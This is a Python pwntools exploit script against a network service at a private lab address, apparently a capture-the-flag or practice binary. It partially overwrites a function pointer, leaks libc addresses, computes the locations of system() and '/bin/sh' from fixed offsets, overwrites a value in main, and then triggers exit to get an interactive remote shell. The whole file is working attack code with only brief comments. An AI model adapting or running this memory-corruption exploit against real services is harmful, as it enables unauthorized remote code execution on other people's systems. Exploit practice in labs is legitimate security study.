#!/usr/bin/python

from pwn import *
import sys

conn = remote("192.168.56.104",666)

username = "A" * 31
desc = "B"*90+"\xe2\x5b" #partial overwrite of print_name func

tick = 0.3

try:
	conn.sendline("1")
	sleep(tick)
	print conn.recvuntil("Enter your name:")
	log.info("username %s",username)
	conn.sendline(username)
	sleep(tick)
	print conn.recvuntil("Enter your description:")
	log.info("description %s",desc)
	conn.send(desc)
	sleep(tick)
	print conn.recv()
	#conn.interactive()
	conn.sendline("3")
	print conn.recv()
	data = conn.recv()

	if data:
		print data
		print "DATA LEN",len(data)
		print "FILTERED DATA", data[171:179]
		leak1 = data[170:174]
		leak2 = data[174:178]


		log.info("leak 1 %s",hex(u32(leak1)))
		log.info("leak 2 %s",hex(u32(leak2)))
		conn.sendline("1")
		print conn.recvuntil("Enter your name:")
		conn.sendline(username)
		print conn.recvuntil("Enter your description:")

		system_addr = u32(leak1) - 1694290
		shell = u32(leak1) - 512446
		log.info("System address %s", hex(system_addr))
		log.info("Shell address %s", hex(shell))

		payload = "CC"+p32(system_addr)+"DDDD"+p32(shell)
		# send payload again as description this overwrites EXIT_SUCESS in main
		# then provide system and bin/sh address calculated as offset from leak 1
		#game over ;]

		conn.send(payload)

		conn.send("4")
		#this will triger exit to start system call

		conn.interactive()

except EOFError:
	pass


